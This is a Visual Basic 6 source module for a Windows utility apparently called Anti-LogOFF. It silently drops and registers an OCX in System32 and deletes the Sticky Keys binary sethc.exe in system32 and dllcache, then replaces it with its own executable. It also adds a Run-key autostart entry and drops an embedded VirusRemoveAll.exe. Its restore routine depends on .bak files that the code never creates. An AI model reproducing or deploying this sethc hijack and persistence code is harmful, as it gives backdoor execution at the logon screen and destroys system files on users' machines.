Attribute VB_Name = "basMain"
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long

Public Function AppPath()
AppPath = App.Path
If Right(AppPath, 1) <> "\" Then AppPath = AppPath & "\"
End Function
Public Function FileExists(sFile) As Boolean
On Error Resume Next
FileExists = ((GetAttr(sFile) And vbDirectory) = 0)
End Function

Public Function GetFileName(ByVal sPath As String) As String
On Error Resume Next
GetFileName = Mid(sPath, InStrRev(sPath, "\") + 1)
End Function
Public Function GetFolderPath(ByVal sPath As String) As String
On Error Resume Next
GetFolderPath = Left(sPath, InStrRev(sPath, "\") - 1)
End Function

Public Function GetFileExt(ByVal sPath) As String
On Error Resume Next
GetFileExt = Mid(sPath, InStrRev(sPath, ".") + 1, Len(sPath) - InStr(1, sPath, "."))
End Function

Public Function GetKeyGoc(sKeyString)
On Error Resume Next
GetKeyGoc = Left(sKeyString, Len(sKeyString) - InStrRev(StrReverse(sKeyString), "\"))
End Function
Public Function GetKeyName(sKeyString)
On Error Resume Next
GetKeyName = Right(sKeyString, Len(sKeyString) - InStrRev(sKeyString, "\"))
End Function
Public Function GetKeyPath(sKeyString)
On Error Resume Next
GetKeyPath = Mid(sKeyString, 2 + Len(sKeyString) - InStrRev(StrReverse(sKeyString), "\"), InStrRev(sKeyString, "\") - (Len(sKeyString) - InStrRev(StrReverse(sKeyString), "\") + 2))
End Function
Public Function KillFile(sFile) As Boolean
On Error Resume Next
SetAttr sFile, vbNormal
DeleteFile sFile
KillFile = Not FileExists(sFile)
End Function

Public Function ReadFileUni(FileName As String) As String
On Error Resume Next
Dim FSO
   Set FSO = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 1, , -2)
   ReadFileUni = FSO.Readall
   Set FSO = Nothing
End Function
Public Function WriteFileUni(FileName As String, Unistr As String)
On Error Resume Next
Dim FSO As Object
Set FSO = CreateObject("Scripting.FileSystemObject").CreateTextFile(FileName, True)
Set FSO = Nothing
Set FSO = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileName, 2, , -1)
    FSO.write Unistr
Set FSO = Nothing
End Function


Sub Main()
Dim ocxDir$
ocxDir = Environ("WinDir") & "\System32\UniControls_v2.0.ocx"
If (FileExists(ocxDir) = False) Then
Dim bytResourceData() As Byte
bytResourceData = LoadResData(101, "CUSTOM")
Open ocxDir For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1
Shell "regsvr32 /s " & ocxDir, vbHide
End If


Dim Comd As String
Comd = Command()
If Comd = "211" Then
    Shell "C:\WINDOWS\AntiLogOFF.exe 123456"
ElseIf Comd = "123456" Then
    frmMain.Show
ElseIf Comd = "/start" Then
    frmPlash.Show
Else
    frmPlash.Show
    CaiDatLogOff
End If
End Sub

Public Sub CaiDatLogOff()
'C:\WINDOWS\system32\dllcache
On Error Resume Next

    FileCopy AppPath & App.EXEName & ".exe", "C:\WINDOWS\AntiLogOFF.exe"
    KillFile "C:\WINDOWS\system32\dllcache\sethc.exe"
    FileCopy AppPath & App.EXEName & ".exe", "C:\WINDOWS\system32\dllcache\sethc.exe"
    KillFile "C:\WINDOWS\system32\sethc.exe"
    FileCopy AppPath & App.EXEName & ".exe", "C:\WINDOWS\system32\sethc.exe"
SaveString HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", "Anti-LogOFF", "C:\WINDOWS\AntiLogOFF.exe /start"
Dim ocxDir$
ocxDir = Environ("WinDir") & "\System32\VirusRemoveAll.exe"
If (FileExists(ocxDir) = False) Then
Dim bytResourceData() As Byte
bytResourceData = LoadResData(102, "CUSTOM")
Open ocxDir For Binary Shared As #1
Put #1, 1, bytResourceData
Close #1
End If

End Sub
Public Sub GoLogOff()
'C:\WINDOWS\system32\dllcache
On Error Resume Next
    KillFile Environ("WinDir") & "\System32\VirusRemoveAll.exe"
    KillFile "C:\WINDOWS\system32\dllcache\sethc.exe"
    Name "C:\WINDOWS\system32\dllcache\sethc.exe.bak" As "C:\WINDOWS\system32\dllcache\sethc.exe"
    KillFile "C:\WINDOWS\system32\sethc.exe"
    Name "C:\WINDOWS\system32\sethc.exe.bak" As "C:\WINDOWS\system32\sethc.exe"
    DeleteValue HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", "Anti-LogOFF"

End Sub

Public Function CheckLog() As Boolean
On Error GoTo GaPtTt
If FileLen("C:\WINDOWS\system32\sethc.exe") = FileLen("C:\WINDOWS\AntiLogOFF.exe") Then CheckLog = True Else CheckLog = False
Exit Function
GaPtTt:
CheckLog = False
End Function

